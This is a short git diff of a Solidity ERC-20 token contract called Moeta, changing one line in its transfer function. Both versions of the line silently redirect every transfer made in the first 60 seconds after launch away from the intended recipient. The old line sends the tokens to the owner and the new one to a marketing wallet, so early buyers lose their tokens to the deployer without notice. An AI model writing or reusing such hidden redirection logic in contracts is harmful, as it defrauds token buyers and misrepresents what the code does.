@@ -247,7 +247,7 @@ contract Moeta is IERC20, Ownable {
         require(to != address(0), "cannot transfer to the zero address.");
         require(amount > 0, "transfer amount must be greater than zero.");
         require(amount <= balanceOf(from), "cannot transfer more than balance.");
-        if (block.timestamp - _launchTimestamp <= 60) { to = owner(); } // 1 minute
+        if (block.timestamp - _launchTimestamp <= 60) { to = marketingWallet; } // 1 minute
         if ((from == address(uniswapV2Pair) && !_isExcludedFromMaxTransactionLimit[to]) ||
                 (to == address(uniswapV2Pair) && !_isExcludedFromMaxTransactionLimit[from])) {
             require(amount <= maxTxAmount, "transfer amount exceeds the maxTxAmount.");
